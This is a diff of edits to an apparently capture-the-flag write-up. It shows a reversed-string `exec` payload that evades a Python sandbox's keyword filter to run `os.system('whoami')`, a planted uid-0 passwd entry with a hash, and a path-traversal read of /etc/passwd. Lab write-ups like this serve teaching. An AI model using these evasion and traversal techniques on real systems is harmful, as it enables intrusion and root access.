@@ -112,7 +112,11 @@ exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
 The `noimportos_sandbox.py` checks the input string if contains these 3 strings : `import` , `os` and `open`
 
 We can simple execute these disallowed values using the reverse order,
-For example the `tropmi[::-1]` == `import`
+For example the
+
+```python
+tropmi[::-1] == import
+```
 
 Our stealth code is :
 
@@ -123,7 +127,7 @@ exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
 equals to :
 
 ```python
-exec("import os; os.system("whoami")
+exec("import os; os.system("whoami""))
 ```
 
 ![image](/assets/img/pylington/6.PNG)
@@ -276,7 +280,7 @@ alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
 
 #### Final Step
 
-Because the script checks online the starting string we can file inclusion the ```/srv/backups/../../etc/passwd```
+Because the script checks only the starting string we can file inclusion the ```/srv/backups/../../etc/passwd```
 <br>
 So, i typed :
 <br>
